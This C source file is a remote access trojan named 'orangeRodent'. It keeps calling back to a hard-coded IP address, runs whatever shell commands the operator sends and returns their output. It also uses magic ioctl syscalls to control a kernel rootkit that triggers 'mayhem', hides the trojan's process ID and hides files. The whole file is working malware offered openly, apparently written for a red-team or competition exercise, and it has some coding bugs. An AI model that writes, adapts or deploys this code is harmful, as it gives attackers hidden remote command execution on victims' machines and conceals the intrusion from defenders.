#include <arpa/inet.h>
#include <netdb.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <strings.h>
#include <sys/socket.h>
#include <unistd.h>
#include <fcntl.h>
#include <sys/syscall.h>

#define SA struct sockaddr
#define PORT 4200
#define ROOTKIT -1877
#define BUFSIZE 100
#define SENDPID 8008
#define GOTIME 8675309
#define CHECKUP 80085
#define GOODRET 42
#define HIDEFILE 1234   

char ip[] = "172.100.0.3";
int port = 4243;

void connectContinously(char tunnelIP[], int tunnelPort);
int handleConnection(int sockfd);
int makeSocket();
int connectRat(int sockfd, char tunnelIP[], int tunnelPort);
void signalRootKit(int sockfd);
void checkRootkit(int sockfd);
void execute(int sockfd, char* cmd);

int main(int argc, char* argv[]) {
    connectContinously(ip, port);
}

void connectContinously(char tunnelIP[], int tunnelPort) {
    int sockfd = makeSocket();
    int connStat = 0;
    while(1) {
        if(connStat = 2) {
            printf("Recreating socket... \n");
            sockfd = makeSocket();
        }
        printf("attempting connection... \n");
        int status = connectRat(sockfd, tunnelIP, tunnelPort);
        if(status > -1) {
            printf("connection succesful... \n");
            connStat = handleConnection(sockfd);
        } else {
            printf("connections failed, waiting... \n");
        }
        sleep(rand() % 30) + 5;
    }
}

int handleConnection(int sockfd) {
    char buf[512];
    bzero(buf, sizeof(buf));

    char intro[] = "You have logged into the orangeRodent \n Send \"quit\" to quit \n Send \"orange\"to cause mass mayhem \n Send \"execute cmd\" to execute command \"cmd\" and receive it's output \n Send \"status\" to see the status of the rootkit \n";

    char exit[] = "Exiting TCP connection with rodent... \n";
    char orange[] = "It's about to be a fine blueland day... \n";
    char status[] = "Fetching status of rootkit... \n";
    char execution[] = "Executing command... \n";

    write(sockfd, intro, sizeof(intro));

    while(1) {
        int stat = read(sockfd, buf, sizeof(buf));
        if(stat == 0) {
            printf("Connection forcibly closed... \n");
            close(sockfd);
            return 2;
        }
        buf[strlen(buf)-1] = '\x00';
        printf("From user: %s\n", buf);
        if((strcmp(buf, "quit")) == 0) {
            printf("Client exit... \n");
            write(sockfd, exit, sizeof(exit));
            close(sockfd);
            return 2;
        }
        if((strcmp(buf, "orange")) == 0) {
            printf("Prepare for explosions...\n");
            write(sockfd, orange, sizeof(orange));
            signalRootKit(sockfd);
        }
        if((strcmp(buf, "status")) == 0) {
            printf("Checking in with the rootkit...\n");
            write(sockfd, status, sizeof(status));
            checkRootkit(sockfd);
        }
        if((strncmp(buf, "execute", 7)) == 0) {
            printf("Executing %s...\n", buf + 8);
            write(sockfd, execution, sizeof(execution));
            execute(sockfd, buf + 8);
        }
        bzero(buf, sizeof(buf));
    }
    return 0;
}

int makeSocket() {
    int sockfd = socket(AF_INET, SOCK_STREAM, 0);

    if(sockfd == -1) {
        printf("socket creation failed... \n");
        exit(0);
    }
    else
        printf("Socket succsfully created... \n");

    return sockfd; 
}

int connectRat(int sockfd, char tunnelIP[], int tunnelPort) {
    int connfd;
    struct sockaddr_in servaddr, tcpClient;

    bzero(&servaddr, sizeof(servaddr));

    servaddr.sin_family = AF_INET;
    servaddr.sin_addr.s_addr = inet_addr(tunnelIP);
    servaddr.sin_port = htons(tunnelPort);

    if(connect(sockfd, (struct sockaddr*)&servaddr, sizeof(servaddr)) != 0) {
        printf("connections with the server failed... \n");
        return -1;
    }
    else
        printf("connected to the server... \n");
        return 1;
}

void signalRootKit(int sockfd) {
    char success[] = "Kit hooked...\n";
    char fail[] = "Kit failed to hook...\n";
    int status = syscall(SYS_ioctl, ROOTKIT, GOTIME);
    if(status == GOODRET) {
        write(sockfd, success, sizeof(success));
    } else {
        write(sockfd, fail, sizeof(fail));
    }
}

void checkRootkit(int sockfd) {
    //syscall: open certain file name, expect an unusual and specific return
   char success[] = "Kit hooked...\n";
    char fail[] = "Kit failed to hook...\n";
    int status = syscall(SYS_ioctl, ROOTKIT, CHECKUP);
    if(status == GOODRET) {
        write(sockfd, success, sizeof(success));
    } else {
        write(sockfd, fail, sizeof(fail));
    }
}

void hideMyPid(int sockfd) {
    int pid = getpid();
    char success[] = "Kit hooked...\n";
    char fail[] = "Kit failed to hook...\n";
    int status = syscall(SYS_ioctl, ROOTKIT, SENDPID, pid);
    if(status == GOODRET) {
        write(sockfd, success, sizeof(success));
    } else {
        write(sockfd, fail, sizeof(fail));
    } 
}

void hideMyFileName(char *fname[]) {
    char success[] = "Kit hooked...\n";
    char fail[] = "Kit failed to hook...\n";
    int status = syscall(SYS_ioctl, ROOTKIT, HIDEFILE, (long)fname);
    // if(status == GOODRET) {
    //         write(sockfd, success, sizeof(success));
    //     } else {
    //         write(sockfd, fail, sizeof(fail));
    //     } 
}

void execute(int sockfd, char* cmd){
    FILE *fp;
    char path[1035];

    char fail[] = "Failed to run command\n";

    char* act_cmd = (char*)calloc(strlen(cmd) + strlen(" 2>&1"), sizeof(char));
    strncpy(act_cmd, cmd, strlen(cmd));
    strncpy(act_cmd + strlen(cmd), " 2>&1 ", strlen(" 2>&1"));
    fp = popen(act_cmd, "r");
    if (fp == NULL) 
        write(sockfd, fail, sizeof(fail));
    else
        while (fgets(path, sizeof(path), fp) != NULL)
            write(sockfd, path, strlen(path));
    free(act_cmd);
}

